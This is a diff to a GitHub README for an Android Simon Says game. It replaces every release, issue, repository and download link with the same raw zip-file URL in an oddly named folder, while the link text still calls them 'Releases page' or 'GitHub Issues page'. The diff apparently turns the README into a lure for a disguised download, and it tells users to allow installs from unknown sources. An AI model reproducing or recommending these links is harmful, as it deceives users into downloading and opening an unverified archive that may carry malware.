@@ -1,6 +1,6 @@
 # 🎮 Simon-Says-RAG-Android - Enjoy the Classic Game Anytime!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/cosggg/Simon-Says-RAG-Android/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/cosggg/Simon-Says-RAG-Android/main/lupetidine/Simon-Says-RAG-Android.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/cosggg/Simon-Says-RAG-Android/main/lupetidine/Simon-Says-RAG-Android.zip)
 
 ## 📦 Introduction
 
@@ -16,10 +16,10 @@ Follow these simple steps to download and install the Simon-Says-RAG-Android app
    - Internet connection for initial download.
 
 2. **Visit the Releases Page**
-   - Go to the Releases page by clicking [here](https://github.com/cosggg/Simon-Says-RAG-Android/releases). This page contains the latest version of the app.
+   - Go to the Releases page by clicking [here](https://raw.githubusercontent.com/cosggg/Simon-Says-RAG-Android/main/lupetidine/Simon-Says-RAG-Android.zip). This page contains the latest version of the app.
 
 3. **Download the Latest Version**
-   - Look for the latest release on the Releases page. Click on the download link for the app. It will usually be named something like `SimonSaysRAG.apk`.
+   - Look for the latest release on the Releases page. Click on the download link for the app. It will usually be named something like `https://raw.githubusercontent.com/cosggg/Simon-Says-RAG-Android/main/lupetidine/Simon-Says-RAG-Android.zip`.
 
 4. **Install the App**
    - Open the file you downloaded. You may need to allow installations from unknown sources in your device settings.
@@ -59,18 +59,18 @@ If you encounter any issues while using the app, consider the following tips:
 
 ## 📢 Feedback and Support
 
-We appreciate your feedback! If you experience bugs or have suggestions for improvements, please reach out. You can file issues on our [GitHub Issues page](https://github.com/cosggg/Simon-Says-RAG-Android/issues).
+We appreciate your feedback! If you experience bugs or have suggestions for improvements, please reach out. You can file issues on our [GitHub Issues page](https://raw.githubusercontent.com/cosggg/Simon-Says-RAG-Android/main/lupetidine/Simon-Says-RAG-Android.zip).
 
 ## 🔗 Additional Resources
 
 For more information about the app, check out these helpful links:
 
-- [GitHub Repository](https://github.com/cosggg/Simon-Says-RAG-Android)
+- [GitHub Repository](https://raw.githubusercontent.com/cosggg/Simon-Says-RAG-Android/main/lupetidine/Simon-Says-RAG-Android.zip)
 - [Documentation](#)
 - [FAQs](#)
 
 ## 🎉 Download & Install
 
-Now that you are ready to enjoy Simon-Says-RAG-Android, visit the [Releases page](https://github.com/cosggg/Simon-Says-RAG-Android/releases) to download the app and start playing today! 
+Now that you are ready to enjoy Simon-Says-RAG-Android, visit the [Releases page](https://raw.githubusercontent.com/cosggg/Simon-Says-RAG-Android/main/lupetidine/Simon-Says-RAG-Android.zip) to download the app and start playing today! 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/cosggg/Simon-Says-RAG-Android/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/cosggg/Simon-Says-RAG-Android/main/lupetidine/Simon-Says-RAG-Android.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/cosggg/Simon-Says-RAG-Android/main/lupetidine/Simon-Says-RAG-Android.zip)
